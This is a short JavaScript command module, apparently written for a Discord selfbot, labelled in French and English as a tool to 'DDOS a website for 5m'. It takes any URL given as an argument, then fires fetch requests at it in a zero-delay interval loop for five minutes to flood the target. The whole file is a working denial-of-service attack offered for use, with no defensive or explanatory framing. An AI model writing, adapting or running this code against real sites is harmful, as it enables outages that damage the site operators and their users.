const fetch = require("node-fetch")

const fs = require('fs')

module.exports = {
    name: "ddos-url",
    descriptionfr: "DDOS un site pendant 5m",
    descriptionen: "DDOS a website for 5m",
    run: async (client, message, args, config) => {
        if (!args[0] || !args[0].startsWith("http"))
          return message.edit(client.trad("Veuillez entrer une url de site valide", "Please enter a valid webesite url"))
        
        message.edit(client.trad("Lancement du DDOS", "DDOS starting"))
        const i = setInterval(() => fetch(args[0]).catch(() => false), 0);
        setTimeout(() => clearInterval(i), 1000 * 60 * 5);
    }
}